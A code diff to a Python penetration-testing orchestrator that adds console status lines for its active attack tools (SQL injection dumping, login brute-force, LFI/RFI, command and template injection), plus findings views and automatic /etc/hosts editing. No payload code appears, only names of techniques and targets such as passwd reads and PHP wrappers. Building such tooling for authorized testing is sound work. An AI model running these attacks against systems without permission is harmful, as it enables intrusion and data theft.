     tlabel, runner = _STEP_TOOLS[tool_key]
     prev = fetch_step_status(ip, port, proto, key).get(n)     # so an error can restore it
     set_step_status(ip, port, proto, key, n, "running")       # show ⏳ in the checklist now
-    job = _new_job("5", f"{tool_key} · {ip}:{port}", f"{tlabel} on {ip}:{port}/{proto}")
+    job = _new_job("5", f"{_label} ({ip}:{port}/{proto})", f"{tlabel} on {ip}:{port}/{proto}")
     threading.Thread(target=_step_tool_worker,
                      args=(job, ip, port, proto, tool_key, runner, key, n, prev),
                      daemon=True).start()
     print(f"\n{GREEN}▶ {tlabel} running in the background{RESET} "
           f"{DIM}({ip}:{port}/{proto}) — check {BOLD}[s] status{RESET}{DIM}; output → "
           f"{BOLD}DETAILS{RESET}{DIM} / {BOLD}[f] findings{RESET}")
+    if tool_key == "vhost-fuzz":                  # tell the user which wordlist was chosen
+        wl_label, words = _pick_vhost_wordlist()
+        print(f"{DIM}   wordlist: {BOLD}{wl_label}{RESET}{DIM} ({len(words)} words) · "
+              f"deadline {_VHOST_DEADLINE // 60} min{RESET}")
+    if tool_key == "dir-brute":                   # wordlist + how many targets (host + vhosts)
+        wl_label, words = _pick_dirb_wordlist()
+        nv = len({hn for hn, _p, _s in fetch_hostnames(ip) if hn != ip})
+        print(f"{DIM}   wordlist: {BOLD}{wl_label}{RESET}{DIM} ({len(words)} words) · "
+              f"targets: host + {nv} vhost(s) · deadline {_DIRB_DEADLINE // 60} min{RESET}")
+    if tool_key == "vcs-hunt":                    # signature-checked exposures, host + vhosts
+        nv = len({hn for hn, _p, _s in fetch_hostnames(ip) if hn != ip})
+        print(f"{DIM}   signature-checked exposures · targets: host + {nv} vhost(s) · "
+              f"deadline {_VCS_DEADLINE // 60} min{RESET}")
+    if tool_key == "param-hunt":                  # wordlist + endpoints mined from earlier steps
+        wl_label, words = _pick_param_wordlist()
+        ne = len(_gather_param_endpoints(ip, port, proto))
+        print(f"{DIM}   wordlist: {BOLD}{wl_label}{RESET}{DIM} ({len(words)} params) · "
+              f"endpoints: {ne} · deadline {_PARAM_DEADLINE // 60} min{RESET}")
+    if tool_key == "default-creds":               # small default set, not brute — warn on lockout
+        print(f"{DIM}   default creds only (not brute-force) · {RESET}{YELLOW}⚠ may trigger "
+              f"account lockout{RESET}{DIM} · deadline {_CREDS_DEADLINE // 60} min{RESET}")
+    if tool_key == "auth-bypass":                 # non-destructive SQLi + enum on login forms
+        print(f"{DIM}   non-destructive SQLi bypass + user enumeration on login forms · "
+              f"{RESET}{YELLOW}⚠ active — authorized targets only{RESET}{DIM} · "
+              f"deadline {_AUTHB_DEADLINE // 60} min{RESET}")
+    if tool_key == "login-brute":                 # gated brute — loud warning
+        print(f"{YELLOW}   ⚠ active brute-force{RESET}{DIM} — gates: enum user-list + lockout probe · "
+              f"capped {_BRUTE_MAX_PASS} pw · {RESET}{YELLOW}authorized targets only, may lock "
+              f"accounts{RESET}{DIM} · deadline {_BRUTE_DEADLINE // 60} min{RESET}")
+    if tool_key == "sqli-scan":                   # stdlib detect + auto sqlmap enum/bounded-dump
+        sm = "sqlmap ✓" if shutil.which("sqlmap") else "sqlmap NOT installed"
+        print(f"{YELLOW}   ⚠ active injection tests{RESET}{DIM} — stdlib detect → {sm} enum + "
+              f"bounded dump (os-shell/file-read stay manual) · {RESET}{YELLOW}authorized "
+              f"targets only{RESET}{DIM}{RESET}")
+    if tool_key == "sqli-dump":                   # own engine, no external tool (OSCP-safe)
+        print(f"{YELLOW}   ⚠ active SQLi extraction{RESET}{DIM} — own stdlib engine, "
+              f"NO sqlmap (OSCP-safe) · UNION/error auto-dump, blind for short values · "
+              f"{RESET}{YELLOW}authorized targets only{RESET}{DIM}{RESET}")
+    if tool_key == "lfi-scan":                    # read-only file-read tests, content-verified
+        print(f"{YELLOW}   ⚠ active file-read tests{RESET}{DIM} — read-only, content-verified "
+              f"(passwd/win.ini/environ/php-filter) · RCE stays manual · "
+              f"{RESET}{YELLOW}authorized targets only{RESET}{DIM}{RESET}")
+    if tool_key == "rfi-scan":                    # marker-verified wrapper inclusion, no auto-RCE
+        print(f"{YELLOW}   ⚠ active inclusion tests{RESET}{DIM} — marker echo only (data://, "
+              f"php://input, expect://) · remote webshell stays manual · "
+              f"{RESET}{YELLOW}authorized targets only{RESET}{DIM}{RESET}")
+    if tool_key == "cmdi-scan":                   # computed-marker + time; auto id/uname only
+        print(f"{YELLOW}   ⚠ active command-injection tests{RESET}{DIM} — computed marker + time; "
+              f"auto-runs read-only id/uname · reverse shell stays manual · "
+              f"{RESET}{YELLOW}authorized targets only{RESET}{DIM}{RESET}")
+    if tool_key == "ssti-scan":                   # math-verified; auto-id via engine gadget
+        print(f"{YELLOW}   ⚠ active template-injection tests{RESET}{DIM} — computed math marker; "
+              f"auto-runs read-only id via engine gadget (confirms RCE) · "
+              f"{RESET}{YELLOW}authorized targets only{RESET}{DIM}{RESET}")
+    if tool_key in _HOSTS_WRITING_TOOLS:          # domain-discovery tools: /etc/hosts status
+        if _is_root():
+            print(f"{DIM}   sudo ✓ — discovered domains are auto-added to "
+                  f"{BOLD}/etc/hosts{RESET}{DIM} (removed on exit){RESET}")
+        else:
+            print(f"{YELLOW}   ⚠ no sudo — discovered domains will NOT be written to "
+                  f"/etc/hosts{RESET}{DIM}; re-run under sudo, or use the paste line in "
+                  f"{BOLD}[f] findings{RESET}")
 
 
 def _exploit_service_view(ip: str, target: tuple) -> None:
@@ -2753,6 +6475,12 @@ def _exploit_service_view(ip: str, target: tuple) -> None:
     def _handle(_c, v):
         if v == "":
             return "refresh"
+        if v == "s":                             # bare s → running jobs / tool status
+            _status_view()
+            return "refresh"
+        if v == "f":                             # f → findings harvested from the tools
+            _host_findings_view(ip)
+            return "refresh"
         if v.startswith("s") and v[1:].strip().isdigit():
             _toggle(int(v[1:].strip()), "skip")
             return "refresh"
@@ -2762,11 +6490,13 @@ def _exploit_service_view(ip: str, target: tuple) -> None:
         if v.isdigit():
             _toggle(int(v), "done")
             return "refresh"
-        print(f"{RED}✗ unknown option{RESET} {DIM}— <n> done · s <n> skip · r <n> run · b{RESET}")
+        print(f"{RED}✗ unknown option{RESET} "
+              f"{DIM}— <n> done · s <n> skip · r <n> run · s · f · b{RESET}")
         return "stay"
 
     _run_view(f"{ip}:{port}/{proto} exploit",
-              "[Enter] refresh · <n> done · s <n> skip · r <n> run · [b] back · [m] menu",
+              "[Enter] refresh · <n> done · s <n> skip · r <n> run · "
+              "[s] status · [f] findings · [b] back · [m] menu",
               lambda: _render_exploit_checklist(ip, target), _handle)
 
 
@@ -3081,6 +6811,8 @@ def show_status() -> list:
     groups = _status_groups(jobs)
     for n, g in enumerate(groups, 1):
         title = _PHASES.get(g[0]["phase"], (g[0]["name"],))[0]
+        if g[0]["phase"] == "5":                     # name which service is being exploited
+            title = f"{title} {DIM}—{RESET}{BOLD} {g[0]['name']}"
         state = _agg_state([j["state"] for j in g])
         colour, text = _STATE_LABEL.get(state, (DIM, state))
         found = f"{GREEN}yes{RESET}" if any(j["hosts"] > 0 for j in g) else f"{DIM}no{RESET}"
@@ -3235,6 +6967,7 @@ def _render_host_findings(ip: str) -> None:
     (incl. phase-4 vuln and phase-6 tool results) and the aggregated CVE list — plus the
     raw host-level NSE output (HOST FINDINGS). Per-port tool output lives in each port's
     DETAILS view, not here."""
+    _sync_hosts_block(ip)     # viewing a host's findings as root materialises its DB domains → hosts
     vulns = fetch_vulns(ip)
     host_scripts = fetch_scripts(ip, 0, "")
     hostnames = fetch_hostnames(ip)
@@ -3252,9 +6985,15 @@ def _render_host_findings(ip: str) -> None:
         print(f"  {DIM}none{RESET}")
         return
     if hostnames:
-        print(f"\n  {BOLD}HOSTNAMES{RESET}  {DIM}(add to /etc/hosts → vhost-fuzz){RESET}")
+        note = ("auto-synced to /etc/hosts (removed on exit)" if _is_root()
+                else "no sudo — not in /etc/hosts; paste the line below")
+        print(f"\n  {BOLD}HOSTNAMES{RESET}  {DIM}({note}){RESET}")
         for hn, _port, source in hostnames:
             print(f"    {CYAN}{hn}{RESET}  {DIM}{source}{RESET}")
+        if not _is_root():
+            snip = _hosts_snippet(ip)
+            if snip:
+                print(f"    {DIM}$ {snip}{RESET}")
     if findings:
         print(f"\n  {BOLD}FINDINGS{RESET}")
         for port, proto, script, state, cve, risk, summary in findings:
@@ -3684,6 +7423,8 @@ def main() -> int:
         with _DB_LOCK:
             _db_connect().close()      # (so raw reads like fetch_hosts see new columns)
     _load_jobs()          # restore the saved command history
+    _reconcile_hosts_on_start()          # clear any /etc/hosts residue from a prior session
+    atexit.register(_remove_all_pshunter_hosts)   # best-effort cleanup on a graceful exit
     try:
         while True:
             print_menu()
